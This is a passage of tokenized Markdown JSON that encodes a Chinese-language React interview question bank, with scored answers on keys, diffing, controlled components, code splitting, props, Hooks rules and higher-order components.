级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。\\n\\n- 在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。\\n\\n","task":false,"loose":true,"text":"Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。\\n","tokens":[{"type":"text","raw":"Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。\\n","text":"Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。","tokens":[{"type":"text","raw":"Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。","text":"Keys 是 React 用于追踪哪些列表中元素被修改、被添加或者被移除的辅助标识。","escaped":false}]}]},{"type":"list_item","raw":"- 在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：","task":false,"loose":true,"text":"在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：","tokens":[{"type":"text","raw":"在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：","text":"在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：","tokens":[{"type":"text","raw":"在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：","text":"在 React 中渲染集合时，向每个重复的元素添加关键字对于帮助React跟踪元素与数据之间的关联非常重要。key 应该是唯一ID，最好是 UUID 或收集项中的其他唯一字符串：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"``` react\\n\\n  <ul>\\n  {todos.map((todo) =>\\n    <li key={todo.id}>\\n      {todo.text}\\n    </li>\\n  )};\\n  </ul>\\n\\n```","lang":"react","text":"\\n  <ul>\\n  {todos.map((todo) =>\\n    <li key={todo.id}>\\n      {todo.text}\\n    </li>\\n  )};\\n  </ul>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 28. React diff 原理\\n\\n","depth":2,"text":"28. React diff 原理","tokens":[{"type":"text","raw":"28. React diff 原理","text":"28. React diff 原理","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 把树形结构按照层级分解，只比较同级元素。\\n\\n- 列表结构的每个单元添加唯一的 key 属性，方便比较。\\n\\n- React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）\\n\\n- 合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.\\n\\n- 选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 把树形结构按照层级分解，只比较同级元素。\\n\\n","task":false,"loose":true,"text":"把树形结构按照层级分解，只比较同级元素。\\n","tokens":[{"type":"text","raw":"把树形结构按照层级分解，只比较同级元素。\\n","text":"把树形结构按照层级分解，只比较同级元素。","tokens":[{"type":"text","raw":"把树形结构按照层级分解，只比较同级元素。","text":"把树形结构按照层级分解，只比较同级元素。","escaped":false}]}]},{"type":"list_item","raw":"- 列表结构的每个单元添加唯一的 key 属性，方便比较。\\n\\n","task":false,"loose":true,"text":"列表结构的每个单元添加唯一的 key 属性，方便比较。\\n","tokens":[{"type":"text","raw":"列表结构的每个单元添加唯一的 key 属性，方便比较。\\n","text":"列表结构的每个单元添加唯一的 key 属性，方便比较。","tokens":[{"type":"text","raw":"列表结构的每个单元添加唯一的 key 属性，方便比较。","text":"列表结构的每个单元添加唯一的 key 属性，方便比较。","escaped":false}]}]},{"type":"list_item","raw":"- React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）\\n\\n","task":false,"loose":true,"text":"React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）\\n","tokens":[{"type":"text","raw":"React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）\\n","text":"React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）","tokens":[{"type":"text","raw":"React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）","text":"React 只会匹配相同 class 的 component（这里面的 class 指的是组件的名字）","escaped":false}]}]},{"type":"list_item","raw":"- 合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.\\n\\n","task":false,"loose":true,"text":"合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.\\n","tokens":[{"type":"text","raw":"合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.\\n","text":"合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.","tokens":[{"type":"text","raw":"合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.","text":"合并操作，调用 component 的 setState 方法的时候, React 将其标记为 dirty 到每一个事件循环结束, React 检查所有标记 dirty 的 component 重新绘制.","escaped":false}]}]},{"type":"list_item","raw":"- 选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。","task":false,"loose":true,"text":"选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。","tokens":[{"type":"text","raw":"选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。","text":"选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。","tokens":[{"type":"text","raw":"选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。","text":"选择性子树渲染。开发人员可以重写 shouldComponentUpdate 提高 diff 的性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 29. 受控组件和非受控组件有什么区别？\\n\\n","depth":2,"text":"29. 受控组件和非受控组件有什么区别？","tokens":[{"type":"text","raw":"29. 受控组件和非受控组件有什么区别？","text":"29. 受控组件和非受控组件有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。\\n\\n- 在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。\\n\\n","task":false,"loose":true,"text":"在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。\\n","tokens":[{"type":"text","raw":"在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。\\n","text":"在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。","tokens":[{"type":"text","raw":"在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。","text":"在 HTML 文档中，许多表单元素（例如、、）都保持自己的状态。不受控制的组件将 DOM 视为这些输入状态的真实源。在受控组件中，内部状态用于跟踪元素值。当输入值改变时，React 会重新渲染输入。","escaped":false}]}]},{"type":"list_item","raw":"- 在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。","task":false,"loose":true,"text":"在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。","tokens":[{"type":"text","raw":"在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。","text":"在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。","tokens":[{"type":"text","raw":"在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。","text":"在与非 React 代码集成时，不受控制的组件非常有用（例如，如果您需要支持某种 jQuery 表单插件）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 30. React如何进行代码拆分？拆分的原则是什么？\\n\\n","depth":2,"text":"30. React如何进行代码拆分？拆分的原则是什么？","tokens":[{"type":"text","raw":"30. React如何进行代码拆分？拆分的原则是什么？","text":"30. React如何进行代码拆分？拆分的原则是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。\\n\\n- 在我们的react项目中：\\n\\n- 在 api 层面我们单独封装，对外暴露 http 请求的结果。\\n\\n- 数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。\\n\\n- 视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。\\n\\n- 静态类型的资源单独放置\\n\\n- 公共组件、高阶组件、插件单独放置\\n\\n- 工具类文件单独放置","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。\\n\\n","task":false,"loose":true,"text":"react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。\\n","tokens":[{"type":"text","raw":"react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。\\n","text":"react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。","tokens":[{"type":"text","raw":"react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。","text":"react 的拆分前提是代码目录设计规范，模块定义规范，代码设计规范，符合程序设计的一般原则，例如高内聚、低耦合等等。","escaped":false}]}]},{"type":"list_item","raw":"- 在我们的react项目中：\\n\\n","task":false,"loose":true,"text":"在我们的react项目中：\\n","tokens":[{"type":"text","raw":"在我们的react项目中：\\n","text":"在我们的react项目中：","tokens":[{"type":"text","raw":"在我们的react项目中：","text":"在我们的react项目中：","escaped":false}]}]},{"type":"list_item","raw":"- 在 api 层面我们单独封装，对外暴露 http 请求的结果。\\n\\n","task":false,"loose":true,"text":"在 api 层面我们单独封装，对外暴露 http 请求的结果。\\n","tokens":[{"type":"text","raw":"在 api 层面我们单独封装，对外暴露 http 请求的结果。\\n","text":"在 api 层面我们单独封装，对外暴露 http 请求的结果。","tokens":[{"type":"text","raw":"在 api 层面我们单独封装，对外暴露 http 请求的结果。","text":"在 api 层面我们单独封装，对外暴露 http 请求的结果。","escaped":false}]}]},{"type":"list_item","raw":"- 数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。\\n\\n","task":false,"loose":true,"text":"数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。\\n","tokens":[{"type":"text","raw":"数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。\\n","text":"数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。","tokens":[{"type":"text","raw":"数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。","text":"数据层我们使用的 mobx 封装处理异步请求和业务逻辑处理。","escaped":false}]}]},{"type":"list_item","raw":"- 视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。\\n\\n","task":false,"loose":true,"text":"视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。\\n","tokens":[{"type":"text","raw":"视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。\\n","text":"视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。","tokens":[{"type":"text","raw":"视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。","text":"视图层，尽量使用 mobx 层面的传递过来的数据，修改逻辑。","escaped":false}]}]},{"type":"list_item","raw":"- 静态类型的资源单独放置\\n\\n","task":false,"loose":true,"text":"静态类型的资源单独放置\\n","tokens":[{"type":"text","raw":"静态类型的资源单独放置\\n","text":"静态类型的资源单独放置","tokens":[{"type":"text","raw":"静态类型的资源单独放置","text":"静态类型的资源单独放置","escaped":false}]}]},{"type":"list_item","raw":"- 公共组件、高阶组件、插件单独放置\\n\\n","task":false,"loose":true,"text":"公共组件、高阶组件、插件单独放置\\n","tokens":[{"type":"text","raw":"公共组件、高阶组件、插件单独放置\\n","text":"公共组件、高阶组件、插件单独放置","tokens":[{"type":"text","raw":"公共组件、高阶组件、插件单独放置","text":"公共组件、高阶组件、插件单独放置","escaped":false}]}]},{"type":"list_item","raw":"- 工具类文件单独放置","task":false,"loose":true,"text":"工具类文件单独放置","tokens":[{"type":"text","raw":"工具类文件单独放置","text":"工具类文件单独放置","tokens":[{"type":"text","raw":"工具类文件单独放置","text":"工具类文件单独放置","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 31. 为什么说React中的props是只读的？\\n\\n","depth":2,"text":"31. 为什么说React中的props是只读的？","tokens":[{"type":"text","raw":"31. 为什么说React中的props是只读的？","text":"31. 为什么说React中的props是只读的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改","task":false,"loose":false,"text":"保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改","tokens":[{"type":"text","raw":"保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改","text":"保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改","tokens":[{"type":"text","raw":"保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改","text":"保证react的单向数据流的设计模式，使状态更可预测。如果允许自组件修改，那么一个父组件将状态传递给好几个子组件，这几个子组件随意修改，就完全不可预测，不知道在什么地方修改了状态，所以我们必须像纯函数一样保护 props 不被修改","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 32. 使用Hooks要遵守哪些原则？\\n\\n","depth":2,"text":"32. 使用Hooks要遵守哪些原则？","tokens":[{"type":"text","raw":"32. 使用Hooks要遵守哪些原则？","text":"32. 使用Hooks要遵守哪些原则？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。\\n\\n- 只在 React 函数中调用 Hook","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。\\n\\n","task":false,"loose":true,"text":"只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。\\n","tokens":[{"type":"text","raw":"只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。\\n","text":"只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。","tokens":[{"type":"text","raw":"只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。","text":"只在最顶层使用 Hook  不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。","escaped":false}]}]},{"type":"list_item","raw":"- 只在 React 函数中调用 Hook","task":false,"loose":true,"text":"只在 React 函数中调用 Hook","tokens":[{"type":"text","raw":"只在 React 函数中调用 Hook","text":"只在 React 函数中调用 Hook","tokens":[{"type":"text","raw":"只在 React 函数中调用 Hook","text":"只在 React 函数中调用 Hook","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"不要在普通的 JavaScript 函数中调用 Hook。你可以：","text":"不要在普通的 JavaScript 函数中调用 Hook。你可以：","tokens":[{"type":"text","raw":"不要在普通的 JavaScript 函数中调用 Hook。你可以：","text":"不要在普通的 JavaScript 函数中调用 Hook。你可以：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 在 React 的函数组件中调用 Hook\\n\\n- 在自定义 Hook 中调用其他 Hook","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 在 React 的函数组件中调用 Hook\\n\\n","task":false,"loose":true,"text":"在 React 的函数组件中调用 Hook\\n","tokens":[{"type":"text","raw":"在 React 的函数组件中调用 Hook\\n","text":"在 React 的函数组件中调用 Hook","tokens":[{"type":"text","raw":"在 React 的函数组件中调用 Hook","text":"在 React 的函数组件中调用 Hook","escaped":false}]}]},{"type":"list_item","raw":"- 在自定义 Hook 中调用其他 Hook","task":false,"loose":true,"text":"在自定义 Hook 中调用其他 Hook","tokens":[{"type":"text","raw":"在自定义 Hook 中调用其他 Hook","text":"在自定义 Hook 中调用其他 Hook","tokens":[{"type":"text","raw":"在自定义 Hook 中调用其他 Hook","text":"在自定义 Hook 中调用其他 Hook","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 33. 说说对高阶组件（HOC）的理解？\\n\\n","depth":2,"text":"33. 说说对高阶组件（HOC）的理解？","tokens":[{"type":"text","raw":"33. 说说对高阶组件（HOC）的理解？","text":"33. 说说对高阶组件（HOC）的理解？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 高阶函数（Higher-order function），至少满足下列一个条件的函数\\n\\n- 接受一个或多个函数作为输入\\n\\n- 输出一个函数\\n\\n- 在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 高阶函数（Higher-order function），至少满足下列一个条件的函数\\n\\n","task":false,"loose":true,"text":"高阶函数（Higher-order function），至少满足下列一个条件的函数\\n","tokens":[{"type":"text","raw":"高阶函数（Higher-order function），至少满足下列一个条件的函数\\n","text":"高阶函数（Higher-order function），至少满足下列一个条件的函数","tokens":[{"type":"text","raw":"高阶函数（Higher-order function），至少满足下列一个条件的函数","text":"高阶函数（Higher-order function），至少满足下列一个条件的函数","escaped":false}]}]},{"type":"list_item","raw":"- 接受一个或多个函数作为输入\\n\\n","task":false,"loose":true,"text":"接受一个或多个函数作为输入\\n","tokens":[{"type":"text","raw":"接受一个或多个函数作为输入\\n","text":"接受一个或多个函数作为输入","tokens":[{"type":"text","raw":"接受一个或多个函数作为输入","text":"接受一个或多个函数作为输入","escaped":false}]}]},{"type":"list_item","raw":"- 输出一个函数\\n\\n","task":false,"loose":true,"text":"输出一个函数\\n","tokens":[{"type":"text","raw":"输出一个函数\\n","text":"输出一个函数","tokens":[{"type":"text","raw":"输出一个函数","text":"输出一个函数","escaped":false}]}]},{"type":"list_item","raw":"- 在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件","task":false,"loose":true,"text":"在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件","tokens":[{"type":"text","raw":"在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件","text":"在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件","tokens":[{"type":"text","raw":"在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件","text":"在React中，高阶组件即接受一个或多个组件作为参数并且返回一个组件，本质也就是一个函数，并不是一个组件","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 34. 解释 React 中 render() 的目的？\\n\\n","depth":2,"text":"34. 解释 React 中 render() 的目的？","tokens":[{"type":"text","raw":"34. 解释 React 中 render() 的目的？","text":"34. 解释 React 中 render() 的目的？","escaped":false}]},{"type":"heading","raw":"#### 